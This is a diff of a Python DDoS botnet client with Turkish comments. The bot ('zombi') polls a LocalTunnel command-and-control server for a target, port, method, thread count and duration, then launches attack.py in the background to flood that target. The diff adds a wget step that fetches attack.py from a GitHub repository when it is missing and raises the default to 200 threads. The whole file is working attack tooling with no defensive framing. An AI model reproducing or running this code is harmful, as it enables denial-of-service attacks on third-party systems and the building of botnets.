@@ -5,66 +5,58 @@ import requests
 import subprocess
 
 # --- AYARLAR ---
-# LocalTunnel linkin (Beyin adresi)
 MASTER_URL = "https://shy-otters-trade.loca.lt" 
 ZOMBI_AD = f"Zombi-{os.uname()[1]}"
 
 def komut_dinle():
-    print(f"🚀 {ZOMBI_AD} tam yetkiyle hazır!")
-    print(f"📡 Komut Formatı: /method ip port thread süre")
+    print(f"🚀 {ZOMBI_AD} orduda göreve hazır!")
+    print(f"📡 Beyin: {MASTER_URL}")
     
     while True:
         try:
-            # LocalTunnel bypass ve güvenli bağlantı
-            headers = {
-                'bypass-tunnel-reminder': 'true',
-                'User-Agent': 'Zombi-Commander-V1'
-            }
-            
-            # Beyin'den (Panelden) gelen veriyi çek
+            headers = {'bypass-tunnel-reminder': 'true', 'User-Agent': 'Zombi-V2'}
             response = requests.get(f"{MASTER_URL}/get_command", headers=headers, timeout=15)
             
             if response.status_code == 200:
                 data = response.json()
                 
-                # Panelden gelen verileri parçalıyoruz
                 method = data.get("method")
                 target = data.get("target")
                 port = data.get("port", 80)
-                # THREAD ARTIK SENİN KOMUTUNDAN GELİYOR
-                thread_sayisi = data.get("threads") 
                 sure = data.get("duration", 60)
+                
+                # --- AKILLI THREAD AYARI ---
+                # Panelden gelirse onu kullan, gelmezse varsayılan 200 vur!
+                thread_verisi = data.get("threads")
+                t = thread_verisi if thread_verisi else 200
 
                 if method and target:
-                    # Eğer panelden thread gelmezse güvenlik için 100 kullanır
-                    t = thread_sayisi if thread_sayisi else 100
-                    
-                    print(f"\n[!] OPERASYON BAŞLADI!")
-                    print(f"🎯 Hedef: {target}:{port} | 🌪️ Thread: {t} | 🕒 Süre: {sure}s")
+                    print(f"\n[!] EMİR: {method.upper()} -> {target}:{port}")
+                    print(f"🌪️ Thread: {t} | 🕒 Süre: {sure}s")
 
-                    # Attack.py'yi senin verdiğin thread sayısıyla ateşle
+                    # Attack.py'nin orada olduğundan emin ol
+                    if not os.path.exists("attack.py"):
+                        os.system("wget https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/attack.py")
+
+                    # Komutu tam sırasıyla hazırlıyoruz: method target port thread sure
                     attack_cmd = [
                         "python3", "attack.py", 
                         str(method), str(target), str(port), 
                         str(t), str(sure)
                     ]
                     
-                    # Logları attack.log'a yazarak arka planda çalıştır
+                    # Arka planda ateşle
                     with open("attack.log", "a") as log_file:
                         subprocess.Popen(attack_cmd, stdout=log_file, stderr=log_file)
                     
-                    print(f"✅ Saldırı emri iletildi. Mermiler yolda!")
+                    print(f"✅ SALDIRI BAŞLADI!")
 
             time.sleep(5)
             
-        except requests.exceptions.ConnectionError:
-            print("⚠️ Beyin bağlantısı koptu, linki tazele kanka!")
-            time.sleep(10)
         except Exception as e:
             print(f"⚠️ Hata: {e}")
-            time.sleep(5)
+            time.sleep(10)
 
 if __name__ == "__main__":
-    # Yetkileri tazele
     os.system("chmod +x attack.py slave.py")
     komut_dinle()
